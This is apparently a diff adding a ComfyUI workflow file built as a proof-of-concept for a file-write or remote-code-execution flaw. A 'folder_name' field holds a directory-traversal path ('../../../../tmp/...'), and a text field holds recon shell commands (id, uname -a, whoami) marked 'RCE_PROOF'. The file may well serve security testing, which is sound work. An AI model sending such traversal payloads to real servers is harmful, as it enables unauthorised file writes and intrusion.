@@ -1,0 +1,20 @@
+{
+  "1": {
+    "class_type": "LoadImage",
+    "inputs": {
+      "image": "_rce_aab4dc.png"
+    }
+  },
+  "2": {
+    "class_type": "SaveImageTextDataSetToFolder",
+    "inputs": {
+      "images": [
+        "1",
+        0
+      ],
+      "texts": "RCE_PROOF_aab4dc: id; uname -a; whoami",
+      "folder_name": "../../../../tmp/comfyui_rce_proof",
+      "filename_prefix": "proof_aab4dc"
+    }
+  }
+}
